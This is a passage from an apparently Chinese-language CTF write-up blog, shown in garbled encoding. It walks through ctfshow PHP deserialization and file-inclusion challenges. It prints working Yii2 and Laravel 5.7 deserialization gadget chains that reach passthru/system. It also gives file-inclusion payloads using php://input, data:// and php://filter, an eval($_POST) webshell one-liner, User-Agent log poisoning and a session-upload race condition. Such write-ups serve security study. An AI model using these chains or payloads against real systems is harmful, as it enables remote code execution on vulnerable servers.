serialize($a);//è¿è¡Œç»“æœO:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;i:1;s:8:&quot;password&quot;;R:2;&#125;</code></pre><h3 id="web266-phpä¸åŒºåˆ†ç±»åçš„å¤§å°å†™"><a href="#web266-phpä¸åŒºåˆ†ç±»åçš„å¤§å°å†™" class="headerlink" title="web266 phpä¸åŒºåˆ†ç±»åçš„å¤§å°å†™"></a>web266 phpä¸åŒºåˆ†ç±»åçš„å¤§å°å†™</h3><p>phpä¸­ï¼š</p><pre><code>åŒºåˆ†å¤§å°å†™çš„ï¼š å˜é‡åã€å¸¸é‡åã€æ•°ç»„ç´¢å¼•ï¼ˆé”®åkeyï¼‰ä¸åŒºåˆ†å¤§å°å†™çš„ï¼šå‡½æ•°åã€æ–¹æ³•åã€ç±»åã€é­”æœ¯å¸¸é‡ã€NULLã€FALSEã€TRUE</code></pre><p>æ‰€ä»¥è¿™é“é¢˜è§£æ³•å‘¼ä¹‹æ¬²å‡ºï¼šå› ä¸ºæ­£åˆ™è¡¨è¾¾å¼åŒºåˆ†äº†å¤§å°å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œç„¶åååºåˆ—åŒ–ctfshowç±»ï¼Œè¿™æ ·å°±ä¸ä¼šæŠ¥é”™ï¼Œè„šæœ¬æ­£å¸¸ç»“æŸä¹‹åï¼Œå°±å¾ˆè°ƒç”¨__destruct()é­”æ³•æ–¹æ³•ï¼Œè¾“å‡ºflagã€‚</p><pre><code>&lt;?phpclass Ctfshow&#123;    &#125;echo serialize(new Ctfshow());//O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</code></pre><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/114148.png" class=""><h3 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h3><p>å…ˆç”¨adminå¼±å£ä»¤ç™»å½•</p><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/155148.png" class=""><p>åœ¨abouté¡µé¢å‘ç°æç¤º?view-source</p><p>è®¿é—®url&#x2F;?r&#x3D;site&#x2F;about&amp;view-sourceå¾—åˆ°ååºåˆ—åŒ–ç‚¹</p><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/155604.png" class=""><p>POC:</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;tac /flag&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            $this-&gt;formatters[&#39;close&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader = new Generator;        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new yii\db\BatchQueryResult));&#125;</code></pre><p>getä¼ å‚ï¼Œå¾—åˆ°flag</p><pre><code>?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19</code></pre><h3 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h3><p>è¿™é‡Œéœ€è¦æ¢ä¸€æ¡é“¾å­ï¼š</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;ls&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning            $this-&gt;formatters[&#39;isRunning&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;// poc2namespace Codeception\Extension&#123;    use Faker\Generator;    class RunProcess&#123;        private $processes;        public function __construct()        &#123;            $this-&gt;processes = [new Generator()];        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));&#125;?&gt;</code></pre><h3 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h3><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;ls&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning            $this-&gt;formatters[&#39;render&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace phpDocumentor\Reflection\DocBlock\Tags&#123;    use Faker\Generator;    class See&#123;        protected $description;        public function __construct()        &#123;            $this-&gt;description = new Generator();        &#125;    &#125;&#125;namespace&#123;    use phpDocumentor\Reflection\DocBlock\Tags\See;    class Swift_KeyCache_DiskKeyCache&#123;        private $keys = [];        private $path;        public function __construct()        &#123;            $this-&gt;path = new See;            $this-&gt;keys = array(                &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;)            );        &#125;    &#125;    // ç”Ÿæˆpoc    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt;</code></pre><h3 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h3><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;cat /fl*&#39;;        &#125;    &#125;&#125;namespace yii\db&#123;    use yii\web\DbSession;    class BatchQueryResult    &#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader=new DbSession();        &#125;    &#125;&#125;namespace yii\web&#123;    use yii\rest\IndexAction;    class DbSession    &#123;        public $writeCallback;        public function __construct()&#123;            $a=new IndexAction();            $this-&gt;writeCallback=[$a,&#39;run&#39;];        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre><h3 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h3><p>laravel5.7ååºåˆ—åŒ–</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();            $this-&gt;app=new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application&#123;        protected $bindings = [];        public function __construct()&#123;            $this-&gt;bindings=array(                &#39;Illuminate\Contracts\Console\Kernel&#39;=&gt;array(                    &#39;concrete&#39;=&gt;&#39;Illuminate\Foundation\Application&#39;                )            );        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«(ctfshow)</title>
      <link href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"/>
      <url>/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>çœ‹æºç ï¼š</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/110856.png" class=""><p>ç›´æ¥æ„é€ ?file&#x3D;flag.phpï¼Œæ²¡æœ‰ç»“æœï¼Œå› ä¸ºåªæ˜¯åŒ…å«äº†phpæ–‡ä»¶ï¼Œè€Œphpä»£ç æ˜¯ä¸ä¼šæ˜¾ç¤ºåœ¨å‰ç«¯çš„</p><p>1.å¯ä»¥ä½¿ç”¨php:&#x2F;&#x2F;filterä¼ªåè®®ï¼š</p><pre><code>payloadï¼š?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>2.bpæŠ“åŒ…ï¼Œç»™fileä¼ å‚?file&#x3D;php:&#x2F;&#x2F;inputç„¶ååœ¨postè¾“å‡ºæƒ³è¦æ‰§è¡Œçš„ä»£ç </p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/150032.png" class=""><p>3.ä¹Ÿå¯ä»¥ç”¨dataä¼ªåè®®</p><pre><code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;?file=data://text/plain,&lt;?=eval($_POST[1])?&gt;</code></pre><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>è¿™ä¸€å…³ç”¨???ä»£æ›¿äº†php</p><p>1.ä½¿ç”¨dataåè®®ï¼š</p><pre><code>?file=data://text/plain,&lt;?Php system(&#39;tac flag.php&#39;);?&gt; //æ³¨æ„&lt;?phpç¬¬ä¸€ä¸ªpå¤§å†™?file=data://text/plain,&lt;?= system(&#39;tac flag.php&#39;);?&gt; ?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4=</code></pre><p>2.php:&#x2F;&#x2F;inputä¼ªåè®®</p><pre><code>?file=Php://inputå†postï¼š&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></pre><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>phpå’Œdataéƒ½è¢«æ›¿æ¢äº†</p><p>1.php:&#x2F;&#x2F;inputä¼ªåè®®ï¼ˆå¤§å°å†™ç»•è¿‡ï¼‰</p><pre><code>?file=Php://inputå†postï¼š&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></pre><p>2.æ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œä¼ªé€ UAå†™å…¥phpä»£ç </p><p>æ—¥å¿—æ–‡ä»¶è®°å½•äº†æœåŠ¡å™¨æ”¶åˆ°çš„æ¯ä¸€æ¬¡è¯·æ±‚çš„</p><p>IPã€è®¿é—®æ—¶é—´ã€URLã€User-Agentï¼Œè¿™4é¡¹ä¸­çš„å‰ä¸¤é¡¹çš„å€¼éƒ½æ˜¯æˆ‘ä»¬æ— æ³•æ§åˆ¶çš„ï¼Œæˆ‘ä»¬åªèƒ½åœ¨è‡ªå·±å¯ä»¥æ§åˆ¶çš„å­—æ®µä¸Šåšæ‰‹è„šï¼Œå…¶ä¸­URLå­—æ®µç”±äºURLç¼–ç çš„å­˜åœ¨ï¼Œç©ºæ ¼ç­‰ä¸€äº›ç¬¦å·ä¼šè‡ªåŠ¨è¿›è¡Œurlç¼–ç ï¼Œå­˜åˆ°æ—¥å¿—å½“ä¸­æ—¶ï¼Œä¸æ˜¯ä¸€ä¸ªæ­£ç¡®çš„phpè¯­å¥ï¼Œæ— æ³•æˆåŠŸæ‰§è¡Œï¼Œè€ŒUser-Agentåˆ™ä¸ä¼šè¢«è¿›è¡Œä»»ä½•äºŒæ¬¡å¤„ç†ï¼Œæˆ‘ä»¬å‘ä»€ä¹ˆå†…å®¹ï¼ŒæœåŠ¡å™¨å°±å°†å…¶åŸå°ä¸åŠ¨çš„å†™å…¥æ—¥å¿—ã€‚</p><p>nginxæ—¥å¿—æ–‡ä»¶åœ¨&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>å…ˆå†™å…¥æ—¥å¿—ï¼š</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/201035.png" class=""><p>å†åŒ…å«æ—¥å¿—ï¼Œæ‰§è¡Œä»£ç ï¼š</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/202243.png" class=""><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>è¿™é“é¢˜è¿‡æ»¤äº†å†’å·ï¼Œæ‰€ä»¥è¿œç¨‹æ–‡ä»¶åŒ…å«å’Œå¤§å°å†™ç»•è¿‡ä¸è¡Œäº†ï¼Œåªèƒ½ç”¨æ—¥å¿—åŒ…å«ï¼ŒåŒä¸Šé¢˜</p><h3 id="web82-sessionæ–‡ä»¶åŒ…å«"><a href="#web82-sessionæ–‡ä»¶åŒ…å«" class="headerlink" title="web82-sessionæ–‡ä»¶åŒ…å«"></a>web82-sessionæ–‡ä»¶åŒ…å«</h3><p>å‚è€ƒ<a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">https://blog.csdn.net/qq_46918279/article/details/120106832</a></p><pre><code class="markdown">PHPé‡Œé¢å”¯ä¸€æˆ‘ä»¬èƒ½æ§åˆ¶çš„æ²¡æœ‰åç¼€çš„æ–‡ä»¶å°±æ˜¯sessionæ–‡ä»¶åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSå†™å…¥sessionæ–‡ä»¶åŠ æ¡ä»¶ç«äº‰è¾¾åˆ°æ–‡ä»¶åŒ…å«çš„ç›®çš„1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = onï¼ˆé»˜è®¤å¼€å¯ï¼‰3. session.upload_progress.prefix = &quot;upload_progress_&quot;ï¼ˆé»˜è®¤ï¼‰4. session.upload_progress.name = &quot;$PHP_SESSION_UPLOAD_PROGRESS&quot;ï¼ˆé»˜è®¤ï¼‰enabled=onè¡¨ç¤ºupload_progressåŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼›cleanup=onè¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹nameå½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ä¹Ÿå°±æ˜¯PHP_SESSION_UPLOAD_PROGRESSçš„å€¼å¯æ§ï¼›prefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å</code></pre><pre><code class="markdown">å¤§ä½“æ€è·¯ä¸ºï¼š1ã€postä¸€ä¸ªä¸iniä¸­è®¾ç½®çš„session.upload_progress.nameçš„åŒåå˜é‡ï¼ˆé»˜è®¤çš„nameä¸ºâ€œPHP_SESSION_UPLOAD_PROGRESSâ€ï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›ä¸Šä¼ æ–‡ä»¶çš„å®æ—¶è¿›åº¦å¹¶å†™å…¥sessionæ–‡ä»¶ä¸­ã€‚sessionæ–‡ä»¶çš„å†…å®¹ä¸º:ï¼ˆå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯session.upload_progress.prefixä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ï¼‰2ã€å¦‚æœæˆ‘ä»¬postä¼ é€’PHP_SESSION_UPLOAD_PROGRESSçš„å€¼ä¸ºä¸€å¥è¯æœ¨é©¬æ¯”å¦‚ä¸ºï¼š&lt;?php system(&#39;ls&#39;);?&gt;3ã€åŒæ—¶ï¼Œæˆ‘ä»¬åœ¨cookieé‡Œé¢è®¾ç½®åå­—ï¼šPHPSESSIDï¼Œå€¼ï¼šflagï¼Œï¼ˆç›®çš„æ˜¯è®¾ç½®sessionæ–‡ä»¶ï¼Œå› ä¸ºè¿™æ ·æˆ‘ä»¬æ‰èƒ½çŸ¥é“å®æ—¶è¿›åº¦ï¼ˆä¸€å¥è¯æœ¨é©¬ï¼‰ä¸Šä¼ åˆ°å“ªé‡Œäº†ï¼‰ï¼›é‚£ä¹ˆåœ¨/tem/sess_flagè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å°±ä¸ºupload_progress_&lt;?php system(&#39;ls&#39;)?&gt;ã€‚ç„¶ååœ¨includeï¼ˆ/tem/sess_flagï¼‰å°±ä¼šæ‰§è¡Œåé¢çš„phpä»£ç ä»è€ŒæˆåŠŸæ‰§è¡Œrceã€‚4ã€è™½ç„¶æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpä¼šæ¸…ç©ºsessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬è¾¹ä¸Šä¼ è¾¹å»è®¿é—®/tem/sess_aaaè¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½åœ¨åˆ é™¤sessionæ–‡ä»¶å‰è®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚</code></pre><p>æˆ‘ä»¬èƒ½å¤Ÿåˆ›å»ºsessionæ–‡ä»¶çš„åŸå› ï¼šsessioné‡Œæœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸ºoffã€‚ä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID&#x3D;aaaï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š&#x2F;tmp&#x2F;sess_aaaâ€ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Session,å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ã€‚è¿™ä¸ªé”®å€¼ini.get(â€œsession.upload_progress.prefixâ€)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_aaaæ–‡ä»¶é‡Œã€‚</p><p>æ“ä½œï¼š1ã€å…ˆæ„é€ ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ï¼Œå¯¹ç¯å¢ƒä¸Šä¼ ä¸€ä¸ªä»»æ„çš„æ–‡ä»¶ï¼Œå†…å®¹ä¹Ÿä»»æ„ï¼Œç„¶åæŠ“åŒ…ã€‚</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://dadcfcfb-217c-4393-817b-acf2a96574b7.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>2ã€ ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶åŒ…</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/233813.png" class=""><p>æ³¨æ„ä¸¤ç‚¹ï¼š</p><p>ï¼ˆ1ï¼‰è®¾ç½®Cookieï¼šPHPSEESSID&#x3D;flagã€è¿™æ ·æˆ‘ä»¬çš„sessionå°±ä¸º&#x2F;tmp&#x2F;sess_flag</p><p>ï¼ˆ2ï¼‰è®¾ç½®åŒåå˜é‡PHP_SESSION_UPLOAD_PROGRESSï¼Œè®¾ç½®å€¼ä¸ºæˆ‘ä»¬æƒ³è¦å­˜å…¥sessionæ–‡ä»¶çš„ä»£ç ã€‚ï¼ˆæŠŠç¬¬ä¸€æ­¥ä¸­value&#x3D;123çš„æ”¹æ‰å³å¯ï¼Œè¿™é‡Œå¯¹123åŠ ä¸ŠÂ§Â§æ˜¯ä¸ºäº†è¿›è¡Œçˆ†ç ´payloadç”¨ï¼‰<br>3ã€åŒ…å«sessionæ–‡ä»¶ï¼ŒæŠ“åŒ…</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/234110.png" class=""><p>è¿™é‡ŒÂ§aÂ§æ˜¯ä¸ºäº†æ–¹ä¾¿çˆ†ç ´ç”¨</p><p>4ã€è¿›è¡Œçˆ†ç ´</p><p>payloadæ•°é‡å¯ä»¥è®¾ç½®10000æ¬¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ— æ•°æ¬¡ã€‚</p><p>è®¾ç½®çº¿ç¨‹æ•°ï¼ˆç”¨äº†30ï¼‰</p><p>ç„¶åä¸€èµ·çˆ†ç ´ï¼ˆå…ˆå¯¹ä¸Šä¼ æ–‡ä»¶åŒ…ç‚¹å‡»attackï¼Œåœ¨å¯¹&#x2F;tmp&#x2F;sess_flagæ–‡ä»¶åŒ…å«åŒ…ç‚¹å‡»attackï¼Œä¹Ÿå¯ä»¥ä¸ç®¡é¡ºåºï¼Œå› ä¸ºçˆ†ç ´æ¬¡æ•°æœ‰å¾ˆå¤šï¼‰</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/235457.png" class=""><p> æœ€åå°†lsæ”¹æˆtac fl0g.phpå°±è¡Œ </p><h3 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h3><p><strong>session_unset();</strong><br>é‡Šæ”¾å½“å‰åœ¨å†…å­˜ä¸­å·²ç»åˆ›å»ºçš„æ‰€æœ‰$_SESSIONå˜é‡ï¼Œä½†ä¸åˆ é™¤sessionæ–‡ä»¶ä»¥åŠä¸é‡Šæ”¾å¯¹åº”çš„sessionid<br><strong>session_destroy();</strong><br>åˆ é™¤å½“å‰ç”¨æˆ·å¯¹åº”çš„sessionæ–‡ä»¶ä»¥åŠé‡Šæ”¾sessionidï¼Œå†…å­˜ä¸­çš„$_SESSIONå˜é‡å†…å®¹ä¾ç„¶ä¿ç•™<br>æ‰€ä»¥è¿™ä¸¤ä¸ªå‡½æ•°ç­‰åŒäºå°†å†…å­˜ä¸­çš„$_SESSIONå˜é‡é‡Šæ”¾ä¸”åˆ é™¤äº†sessionæ–‡ä»¶å’Œé‡Šæ”¾sessionidï¼Œæˆ‘ä»¬æ˜¯æ— æ³•è¿›è¡Œsessionæ–‡ä»¶åŒ…å«çš„ã€‚ä½†æ˜¯ï¼šæˆ‘ä»¬çš„è„šæœ¬æˆ–è€…bpä»ç„¶èƒ½å¤Ÿè¿›è¡ŒåŒ…å«ã€‚åŸå› åœ¨äºå¤šçº¿ç¨‹ç«äº‰ï¼š</p><pre><code class="markdown">ä»€ä¹ˆæ˜¯å¤šçº¿ç¨‹ç«äº‰çº¿ç¨‹æ˜¯éç‹¬ç«‹çš„ï¼ŒåŒä¸€ä¸ªè¿›ç¨‹é‡Œçº¿ç¨‹æ˜¯æ•°æ®å…±äº«çš„ï¼Œå½“å½“å„ä¸ªçº¿ç¨‹è®¿é—®æ•°æ®èµ„æºæ—¶ä¼šå‡ºç°ç«äº‰çŠ¶æ€å³:æ•°æ®å‡ ä¹åŒæ­¥ä¼šè¢«å¤šä¸ªçº¿ç¨‹å ç”¨ï¼Œé€ æˆæ•°æ®æ··ä¹±ï¼Œå³æ‰€è°“çš„çº¿ç¨‹ä¸å®‰å…¨ ã€‚è¿™æ ·ï¼Œå› ä¸ºåœ¨æ‰§è¡Œsession_unset()ä¸æ‰§è¡Œsession_destroy()çš„æ—¶å€™æœ‰é—´éš”ï¼Œä»–ä»¬ä¸include($file)ç›´æ¥ä¹Ÿä¼šæœ‰é—´éš”ï¼Œæˆ‘ä»¬å…¶ä¸­çš„ä¸€ä¸ªçº¿ç¨‹åœ¨åˆ é™¤sessionæ–‡ä»¶ï¼Œè€Œå¦ä¸€ä¸ªçº¿ç¨‹åˆšåˆšåˆåˆ›å»ºäº†ä¸€ä¸ªsessionæ–‡ä»¶ï¼Œç„¶åå‰é¢çš„çº¿ç¨‹åˆå¼€å§‹åŒ…å«ï¼Œé‚£ä¹ˆè¿˜æ˜¯èƒ½å¤Ÿæ­£å¸¸åŒ…å«ã€‚æ€ä¹ˆè§£å†³å¤šçº¿ç¨‹ç«äº‰é—®é¢˜?---é”é”çš„å¥½å¤„: ç¡®ä¿äº†æŸæ®µå…³é”®ä»£ç (å…±äº«æ•°æ®èµ„æº)åªèƒ½ç”±ä¸€ä¸ªçº¿ç¨‹ä»å¤´åˆ°å°¾å®Œæ•´åœ°æ‰§è¡Œèƒ½è§£å†³å¤šçº¿ç¨‹èµ„ æºç«äº‰ä¸‹çš„åŸå­æ“ä½œé—®é¢˜ã€‚é”çš„åå¤„: é˜»æ­¢äº†å¤šçº¿ç¨‹å¹¶å‘æ‰§è¡Œï¼ŒåŒ…å«é”çš„æŸæ®µä»£ç å®é™…ä¸Šåªèƒ½ä»¥å•çº¿ç¨‹æ¨¡å¼æ‰§è¡Œï¼Œæ•ˆç‡å°±å¤§å¤§åœ°ä¸‹ é™äº†é”çš„è‡´å‘½é—®é¢˜: æ­»é” </code></pre><h3 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h3><p>system(â€œrm -rf &#x2F;tmp&#x2F;*â€)ä¼šå¼ºåˆ¶åˆ é™¤&#x2F;tmp&#x2F;ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p><p>è¿˜æ˜¯web82çš„æ–¹æ³•ï¼Œå¤šçº¿ç¨‹ç«äº‰ç†è§£</p><h3 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h3><p>file_exists â€” æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨,å¦‚æœç”±æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•å­˜åœ¨åˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚</p><p>file_get_contents â€” å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²,å‡½æ•°è¿”å›è¯»å–åˆ°çš„æ•°æ®ï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› falseã€‚</p><p>strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®,è¿”å› needle å­˜åœ¨äº haystack å­—ç¬¦ä¸²èµ·å§‹çš„ä½ç½®(ç‹¬ç«‹äº offset)ã€‚åŒæ—¶æ³¨æ„å­—ç¬¦ä¸²ä½ç½®æ˜¯ä»0å¼€å§‹ï¼Œè€Œä¸æ˜¯ä»1å¼€å§‹çš„ã€‚å¦‚æœæ²¡æ‰¾åˆ° needleï¼Œå°†è¿”å› falseã€‚</p><p>è¿˜æ˜¯web82çš„æ–¹æ³•ã€åŒæ ·çš„é“ç†ï¼šå¤šçº¿ç¨‹ç«äº‰ç†è§£</p><h3 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h3><p>çŸ¥è¯†ç‚¹ï¼š</p><pre><code class="markdown">define â€” å®šä¹‰ä¸€ä¸ªå¸¸é‡dirnameï¼šè¿”å› path çš„çˆ¶ç›®å½•ã€‚ å¦‚æœåœ¨ path ä¸­æ²¡æœ‰æ–œçº¿ï¼Œåˆ™è¿”å›ä¸€ä¸ªç‚¹ï¼ˆ&#39;.&#39;ï¼‰ï¼Œè¡¨ç¤ºå½“å‰ç›®å½•ã€‚å¦åˆ™è¿”å›çš„æ˜¯æŠŠ path ä¸­ç»“å°¾çš„/componentï¼ˆæœ€åä¸€ä¸ªæ–œçº¿ä»¥åŠåé¢éƒ¨åˆ†ï¼‰å»æ‰ä¹‹åçš„å­—ç¬¦ä¸²ã€‚set_include_path â€” 